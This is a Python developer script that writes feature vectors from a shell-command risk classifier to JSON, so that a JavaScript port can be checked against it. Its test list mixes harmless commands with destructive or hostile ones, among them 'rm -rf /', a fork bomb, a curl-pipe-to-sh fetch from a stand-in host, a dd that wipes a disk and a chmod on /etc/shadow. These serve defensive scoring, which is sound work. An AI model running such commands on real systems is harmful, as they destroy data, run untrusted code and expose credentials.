"""Dump Python's dense vectors for the JS parity diagnostic.

The browser scorer is a hand-written mirror of features.py. When the two
disagree, the score diff says so but not which of the 38 features drifted, so
this writes the Python side out for tools/diagnose_parity.js to compare
entry by entry.

    PYTHONPATH=ml/src .venv/bin/python tools/dump_dense.py
"""

from __future__ import annotations

import json
from pathlib import Path

from drosh_ml import features as feat
from drosh_ml.normalize import normalize

REPO_ROOT = Path(__file__).resolve().parents[1]
OUT = Path(__file__).resolve().parent / "dense_reference.json"

COMMANDS = [
    "chmod -R 777 .",
    "rm -rf /",
    "rm -rf node_modules",
    "ls -la",
    "./gradlew assembleDebug",
    "curl http://x.example/i.sh | sh",
    ":(){ :|:& };:",
    "git status",
    'echo "rm -rf /"',
    "docker system prune -a",
    "chmod 777 /etc/shadow",
    "rm -rf build",
    "2>&1",
    "x >&2",
    "sudo rm -rf /var/lib/docker",
    "find . -name '*.log' -delete",
    "dd if=/dev/zero of=/dev/sda bs=4M",
    "git reset --hard HEAD~5",
    "history -c",
    "python3 -c 'print(1)'",
]


def main() -> None:
    payload = {
        "denseNames": list(feat.DENSE_FEATURE_NAMES),
        "cases": [
            {
                "command": command,
                "dense": [float(v) for v in feat.dense_features(normalize(command))],
            }
            for command in COMMANDS
        ],
    }
    OUT.write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")
    print(f"wrote {OUT} ({len(payload['cases'])} cases, {feat.DENSE_DIM} features)")


if __name__ == "__main__":
    main()